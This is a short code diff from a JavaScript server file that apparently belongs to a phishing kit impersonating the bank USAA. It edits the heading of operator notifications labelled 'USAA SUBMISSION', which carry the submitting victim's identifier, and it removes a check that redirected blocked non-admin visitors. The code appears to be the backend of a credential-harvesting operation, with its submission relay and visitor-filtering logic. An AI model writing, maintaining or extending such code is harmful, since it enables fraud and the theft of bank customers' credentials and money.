@@ -373,7 +373,7 @@ async function buildMessage(data, options = {}) {
       heading = `👤 USAA NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `👤 USAA SUBMISSION\n\n User: @${display}`;
+      heading = `👤 USAA SUBMISSION\n\n USER: @${display}`;
     }
 
     let message = `${heading}\n\n`;
@@ -438,9 +438,6 @@ function blockedRedirect(db, io) {
         return res.redirect(routeMap.final);
       }
       
-      if (req.session?.blocked && !req.session?.isAdmin) {
-      	return res.redirect(routeMap.final);
-      	}
 
       next(); // user not blocked → continue
     } catch (err) {
